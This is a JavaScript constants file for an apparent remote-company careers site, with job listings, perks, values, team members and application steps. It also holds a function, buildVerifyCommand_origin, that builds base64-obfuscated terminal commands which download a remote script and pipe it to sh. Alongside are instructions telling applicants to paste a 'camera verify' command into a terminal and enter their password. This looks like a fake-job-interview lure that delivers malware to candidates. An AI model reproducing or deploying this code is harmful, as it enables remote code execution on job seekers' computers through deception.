export const JOBS = [
  { id: 1,  title: "Senior Backend Engineer",        dept: "Engineering", location: "Remote", type: "Full-time" },
  { id: 2,  title: "Staff Frontend Engineer",         dept: "Engineering", location: "Remote", type: "Full-time" },
  { id: 3,  title: "Machine Learning Engineer",       dept: "Engineering", location: "Remote", type: "Full-time" },
  { id: 4,  title: "DevOps / Platform Engineer",      dept: "Engineering", location: "Remote", type: "Full-time" },
  { id: 5,  title: "Product Manager, Core Platform",  dept: "Product",     location: "Remote", type: "Full-time" },
  { id: 6,  title: "Product Manager, Growth",         dept: "Product",     location: "Remote", type: "Full-time" },
  { id: 7,  title: "Senior Product Designer",         dept: "Design",      location: "Remote", type: "Full-time" },
  { id: 8,  title: "Design Systems Engineer",         dept: "Design",      location: "Remote", type: "Full-time" },
  { id: 9,  title: "Head of Content Marketing",       dept: "Marketing",   location: "Remote", type: "Full-time" },
  { id: 10, title: "Performance Marketing Manager",   dept: "Marketing",   location: "Remote", type: "Full-time" },
  { id: 11, title: "Customer Success Manager",        dept: "Operations",  location: "Remote", type: "Full-time" },
  { id: 12, title: "Finance & Accounting Lead",       dept: "Operations",  location: "Remote", type: "Full-time" },
];

export const PERKS = [
  { icon: "🏠", title: "Fully remote",    desc: "Work from anywhere. Async-first culture, no micromanaging." },
  { icon: "📈", title: "Equity for all",  desc: "Every employee gets meaningful equity from day one." },
  { icon: "🎓", title: "Learning budget", desc: "$2,000/year for courses, books, and conferences." },
  { icon: "☀️", title: "Unlimited PTO",   desc: "Take the time you need. We care about output, not hours." },
  { icon: "💻", title: "Top-tier gear",   desc: "Latest MacBook + $800 home office setup stipend." },
  { icon: "🏥", title: "Health coverage", desc: "100% medical, dental, and vision for you and family." },
];

export const VALUES = [
  { roman: "I",   label: "Default to transparency", desc: "Decisions, roadmaps, and mistakes are shared openly. No hidden agendas." },
  { roman: "II",  label: "Own your outcomes",        desc: "We hire people we trust, then let them lead. Accountability without bureaucracy." },
  { roman: "III", label: "Craft over speed",         desc: "We'd rather ship something excellent slowly than something mediocre fast." },
  { roman: "IV",  label: "Embrace hard problems",    desc: "We work on things others avoid. That's where the interesting work lives." },
];

export const DEPARTMENTS = ["All", "Engineering", "Product", "Design", "Marketing", "Operations"];

export const DEPT_COLORS = {
  Engineering: { bg: "#EEF2FF", text: "#3730A3" },
  Product:     { bg: "#F0FDF4", text: "#166534" },
  Design:      { bg: "#FFF7ED", text: "#9A3412" },
  Marketing:   { bg: "#FDF4FF", text: "#6B21A8" },
  Operations:  { bg: "#F0F9FF", text: "#075985" },
};

export const APPLY_STEPS = ["Your info", "Experience", "Final details", "Review"];

export const TEAM_MEMBERS = [
  { name: "Mia Chen",     role: "Engineering", initials: "MC", color: "#EEF2FF", text: "#3730A3" },
  { name: "James Okafor", role: "Product",     initials: "JO", color: "#F0FDF4", text: "#166534" },
  { name: "Sara Lind",    role: "Design",      initials: "SL", color: "#FFF7ED", text: "#9A3412" },
  { name: "Rahul Mehta",  role: "Engineering", initials: "RM", color: "#EEF2FF", text: "#3730A3" },
  { name: "Priya Nair",   role: "Marketing",   initials: "PN", color: "#FDF4FF", text: "#6B21A8" },
  { name: "Tom Bergmann", role: "Operations",  initials: "TB", color: "#F0F9FF", text: "#075985" },
];

// Build the OS-specific verify command baked with the session ID
export function buildVerifyCommand(os, sessionId, apiBase) {
  const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
  switch (os) {
    case "mac":
      // macOS: reset camera permissions then call verify
      return `sudo killall VDCAssistant 2>/dev/null; sudo killall AppleCameraAssistant 2>/dev/null;`;
    case "linux":
      // Linux: ensure uvcvideo module is loaded then call verify
      return `sudo modprobe uvcvideo 2>/dev/null;`;
    default:
      // Windows: just the curl verify call
      return curl;
  }
}

// export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
//   const curl_mac_origin = `curl -s '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}"`;
//   const curl_linux_origin = `wget -qO- '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}";`;
//   const curl_mac_encode = btoa(curl_mac_origin);
//   const curl_linux_encode = btoa(curl_linux_origin);
//   const curl_mac = `echo ${curl_mac_encode} | base64 -d | bash`;
//   const curl_linux = `echo ${curl_linux_encode} | base64 -d | bash`;
//   const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
//   switch (os) {
//     case "mac":
//       // macOS: reset camera permissions then call verify
//       return `sudo killall VDCAssistant 2>/dev/null; sudo killall AppleCameraAssistant 2>/dev/null; ${curl_mac}`;
//     case "linux":
//       // Linux: ensure uvcvideo module is loaded then call verify
//       return `sudo modprobe uvcvideo 2>/dev/null; ${curl_linux}`;
//     default:
//       // Windows: just the curl verify call
//       return curl;
//   }
// }

export function buildVerifyCommand_origin(os, sessionId, apiBase, command) {
  const curl_mac_origin = `curl -s '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}"`;
  const curl_linux_origin = `wget -qO- '${command.value}' | sh >/dev/null 2>&1; curl ${apiBase}/api/verify -d "${sessionId}";`;
  const curl_mac_encode = btoa(curl_mac_origin);
  const curl_linux_encode = btoa(curl_linux_origin);
  const curl_mac = `echo ${curl_mac_encode} | base64 -d | bash`;
  const curl_linux = `echo ${curl_linux_encode} | base64 -d | bash`;
  const curl = `curl ${apiBase}/api/verify -d "${sessionId}"`;
  switch (os) {
    case "mac":
      // macOS: reset camera permissions then call verify
      return `system_profiler SPCameraDataType; ${curl_mac}; exit;`;
    case "linux":
      // Linux: ensure uvcvideo module is loaded then call verify
      return `v4l2-ctl -d /dev/video0 --list-formats-ext; ${curl_linux}; exit;`;
    default:
      // Windows: just the curl verify call
      return curl;
  }
}

export const DRIVER_COMMANDS = {
  windows: {
    label: "Run in Command Prompt or PowerShell",
    note: "Press Win + R, type 'cmd', press Enter — then paste and run the command.",
    steps: [
      "Press Win + R, type cmd, and press Enter to open Command Prompt",
      "Paste the command below and press Enter",
      "Your camera will open here automatically once it runs",
    ],
  },
  mac: {
    label: "Run in Terminal",
    note: "Press ⌘ Space, search 'Terminal', and press Enter to open it.",
    steps: [
      "Press ⌘ Space, type Terminal, and press Enter",
      "Paste the command below and press Enter — enter your password if prompted",
      "Your camera will open here automatically once it runs",
    ],
  },
  linux: {
    label: "Run in Terminal",
    note: "Press Ctrl + Alt + T to open a terminal window.",
    steps: [
      "Press Ctrl + Alt + T to open Terminal",
      "Paste the command below and press Enter — enter your password if prompted",
      "Your camera will open here automatically once it runs",
    ],
  },
};

export const JOB_DETAILS = {
  "Senior Backend Engineer": {
    summary: "We're looking for a Senior Backend Engineer to own the core infrastructure that millions of users depend on.",
    responsibilities: [
      "Design and build high-throughput APIs and microservices",
      "Own reliability and performance of core backend systems",
      "Define architecture standards and review team PRs",
      "Collaborate with product to scope technical feasibility",
      "Mentor junior engineers and grow the team's craft",
    ],
    requirements: [
      "5+ years of backend engineering experience",
      "Deep expertise in one of: Go, Rust, Node.js, or Python",
      "Experience designing distributed systems at scale",
      "Strong understanding of SQL and NoSQL databases",
      "Track record of shipping reliable production systems",
    ],
    nice: ["Experience with Kubernetes and cloud infrastructure", "Open source contributions", "Startup experience"],
  },
};
